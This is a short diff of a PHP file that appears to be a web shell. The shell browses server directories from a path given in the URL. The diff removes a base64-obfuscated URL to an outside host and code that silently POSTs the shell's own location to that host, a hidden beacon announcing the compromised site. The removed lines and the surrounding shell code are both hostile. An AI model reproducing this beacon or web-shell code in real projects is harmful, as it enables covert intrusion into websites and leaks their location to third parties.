@@ -311,7 +311,6 @@ foreach($_POST as $key => $value){
 	$_POST[$key] = stripslashes($value);
 }
 
-$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
 
 if(isset($_GET['path'])){
 	$lokasi = $_GET['path'];
@@ -324,17 +323,7 @@ if(isset($_GET['path'])){
 $lokasi = str_replace('\\','/',$lokasi);
 $lokasis = explode('/',$lokasi);
 $lokasinya = @scandir($lokasi);
-$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-$data = array('file_url' => $cur);
-$options = array(
-    'http' => array(
-        'method'  => 'POST',
-        'header'  => 'Content-type: application/x-www-form-urlencoded',
-        'content' => http_build_query($data),
-    ),
-);
-$context = stream_context_create($options);
-$result = file_get_contents($k3yw, false, $context);
+
 
 foreach($lokasis as $id => $lok){
 	if($lok == '' && $id == 0){
